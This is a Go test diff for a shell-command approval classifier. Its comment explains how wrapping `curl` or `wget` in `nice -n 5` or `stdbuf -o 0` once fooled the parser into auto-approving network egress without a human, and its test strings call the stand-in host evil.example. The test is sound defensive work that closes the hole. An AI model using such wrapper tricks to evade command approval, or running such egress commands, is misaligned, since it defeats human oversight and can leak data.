@@ -296,6 +296,52 @@ func TestClassifyHeuristic_OpaqueArgsNeverProveContainment(t *testing.T) {
 	}
 }
 
+// TestClassifyHeuristic_WrapperOptionValueIsNotArgv0 is the classifier-level
+// half of review finding "important 4", reproduced with the workspace as cwd —
+// the setup in which the mis-peel is not merely wrong but silently ALLOWING.
+//
+// `nice -n 5 curl http://evil.example/x`: nice takes its adjustment as a
+// separate word, so a peel that blindly drops leading `-` words leaves `5` in
+// argv[0] and `curl <url>` as its arguments. Every name-keyed check downstream
+// is then consulted with the wrong name — egressNames["5"] is false, so the
+// egress boundary (the FIRST rule in classifyHeuristic, and the one written so
+// egress "can never fall through to a silent allow") never fires — and the two
+// remaining words resolve as cwd-relative paths that both prove in-workspace.
+// The result was VerdictAllow on arbitrary network egress with no human.
+func TestClassifyHeuristic_WrapperOptionValueIsNotArgv0(t *testing.T) {
+	root := t.TempDir()
+	canon, err := filepath.EvalSymlinks(root)
+	if err != nil {
+		t.Fatal(err)
+	}
+	restore := chdir(t, canon)
+	defer restore()
+
+	for _, cmd := range []string{
+		"nice -n 5 curl http://evil.example/x",
+		"nice --adjustment 5 curl http://evil.example/x",
+		"stdbuf -o 0 curl http://evil.example/x",
+		"stdbuf --error 0 wget http://evil.example/x",
+	} {
+		t.Run(cmd, func(t *testing.T) {
+			segs, err := splitSegments(cmd)
+			if err != nil {
+				return // fail-closed at the parse floor is an acceptable answer.
+			}
+			for i, s := range segs {
+				if s.Name == "5" || s.Name == "0" {
+					t.Errorf("segment %d of %q is named %q: the wrapper's option "+
+						"VALUE was mistaken for argv[0]", i, cmd, s.Name)
+				}
+			}
+			if got := classifyHeuristic(segs, []string{canon}); got == VerdictAllow {
+				t.Errorf("classifyHeuristic(%q) = VerdictAllow with the workspace as "+
+					"cwd — network egress must never auto-approve", cmd)
+			}
+		})
+	}
+}
+
 // TestPathArgs_SkipsOpaquePositions asserts the index alignment directly: the
 // literal operands of a mixed segment are still scoped (skipping too much would
 // be its own bypass — a real out-of-root path silently unchecked), and only the
